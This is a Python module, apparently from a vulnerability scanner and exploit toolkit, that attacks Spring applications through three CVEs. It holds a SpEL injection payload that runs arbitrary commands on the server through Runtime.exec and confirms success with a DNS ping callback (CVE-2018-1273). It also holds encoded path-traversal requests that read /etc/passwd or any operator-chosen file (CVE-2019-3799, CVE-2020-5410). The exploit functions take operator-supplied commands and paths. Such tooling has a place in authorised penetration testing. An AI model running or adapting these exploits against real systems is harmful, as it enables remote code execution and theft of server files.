#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import time
from thirdparty import requests
import threading
from module import globals
from core.verify import verify
from thirdparty.requests_toolbelt.utils import dump
from module.api.dns import dns_result, dns_request


class Spring():
    def __init__(self, url):
        self.url = url
        if self.url[-1] == "/":
            self.url = self.url[:-1]
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()

    def cve_2018_1273_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Spring Data: CVE-2018-1273"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Spring Data Commons 远程命令执行漏洞"
        self.vul_info["vul_numb"] = "CVE-2018-1273"
        self.vul_info["vul_apps"] = "Spring"
        self.vul_info["vul_date"] = "2018-04-11"
        self.vul_info["vul_vers"] = "1.13 - 1.13.10, 2.0 - 2.0.5"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程命令执行漏洞"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Spring Data Commons组件中存在远程代码执行漏洞，" \
                                    "攻击者可构造包含有恶意代码的SPEL表达式实现远程代码攻击，直接获取服务器控制权限。"
        self.vul_info["cre_date"] = "2021-01-26"
        self.vul_info["cre_auth"] = "zhzyker"
        md = dns_request()
        cmd = "ping " + md
        payload = 'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("' + cmd + '")]=&password=&repeatedPassword='
        if r"users?page=&size=5" not in self.url:
            self.url = self.url + "/" + "users?page=&size=5"
        try:
            request = requests.post(self.url, data=payload, headers=self.headers, timeout=self.timeout, verify=False)
            time.sleep(0.5)
            if dns_result(md):
                self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = payload
                self.vul_info["prt_info"] = "[dns] [rce] [payload: " + payload + " ]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2018_1273_exp(self, cmd):
        vul_name = "Spring Data: CVE-2018-1273"
        payload = 'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("' + cmd + '")]=&password=&repeatedPassword='
        if r"users?page=&size=5" not in self.url:
            self.url = self.url + "/" + "users?page=&size=5"
        try:
            request = requests.post(self.url, data=payload, headers=self.headers, timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(request).decode('utf-8', 'ignore')
            verify.exploit_print(request.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def cve_2019_3799_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Spring Cloud: CVE-2019-3799"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "/test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd"
        self.vul_info["vul_name"] = "Spring-Cloud-Config-Server Directory Traversal"
        self.vul_info["vul_numb"] = "CVE-2019-3799"
        self.vul_info["vul_apps"] = "Spring"
        self.vul_info["vul_date"] = "2019-04-22"
        self.vul_info["vul_vers"] = "2.1.0-2.1.1, 2.0.0-2.0.3, 1.4.0-1.4.5"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "Directory Traversal"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "由于spring-cloud-config-server模块未对传入路径进行安全限制，" \
                                    "攻击者可以利用多个..%252f进行目录遍历，查看服务器其他路径的敏感文件，造成敏感信息泄露。"
        self.vul_info["cre_date"] = "2021-01-27"
        self.vul_info["cre_auth"] = "zhzyker"
        try:
            request = requests.get(self.url+self.vul_info["vul_payd"], headers=self.headers, timeout=self.timeout, verify=False)
            if r"x:0:0:root:/root:" in request.text and r"/sbin/nologin" in request.text and r"daemon" in request.text:
                self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[url: " + self.url + self.vul_info["vul_payd"] + " ]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2019_3799_exp(self, cmd):
        vul_name = "Spring Cloud: CVE-2019-3799"
        exp = "/test/pathtraversal/master/..%252f..%252f..%252f..%252f.." + cmd
        self.raw_data = None
        try:
            request = requests.get(self.url + exp, headers=self.headers, timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(request).decode('utf-8', 'ignore')
            verify.exploit_print(request.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def cve_2020_5410_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Spring Cloud: CVE-2020-5410"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "/..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23/a"
        self.vul_info["vul_name"] = "Spring Cloud Config目录穿越漏洞"
        self.vul_info["vul_numb"] = "CVE-2020-5410"
        self.vul_info["vul_apps"] = "Spring"
        self.vul_info["vul_date"] = "2020-06-02"
        self.vul_info["vul_vers"] = "< 2.2.3, < 2.1.9"
        self.vul_info["vul_risk"] = "medium"
        self.vul_info["vul_type"] = "目录穿越漏洞"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Spring Cloud Config，2.2.3之前的2.2.x版本，2.1.9之前的2.1.x" \
                                    "版本以及较旧的不受支持的版本允许应用程序通过spring-cloud-config-server模块提供任意配置文件。" \
                                    "恶意用户或攻击者可以使用特制URL发送请求，这可能导致目录遍历攻击。"
        self.vul_info["cre_date"] = "2021-01-26"
        self.vul_info["cre_auth"] = "zhzyker"
        try:
            request = requests.get(self.url+self.vul_info["vul_payd"], headers=self.headers, timeout=self.timeout, verify=False)
            if request.status_code == 200:
                if r"x:0:0:root:/root:" in request.text and r"/sbin/nologin" in request.text and r"daemon" in request.text:
                    self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                    self.vul_info["prt_resu"] = "PoCSuCCeSS"
                    self.vul_info["prt_info"] = "[url: " + self.url + self.vul_info["vul_payd"] + " ]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2020_5410_exp(self, cmd):
        vul_name = "Spring Cloud: CVE-2020-5410"
        self.raw_data = None
        file = cmd.replace("/", "%252f")
        exp = "/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F.." + file + "%23/a"
        try:
            self.request = requests.get(self.url+exp, headers=self.headers, timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(self.request).decode('utf-8', 'ignore')
            verify.exploit_print(self.request.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)


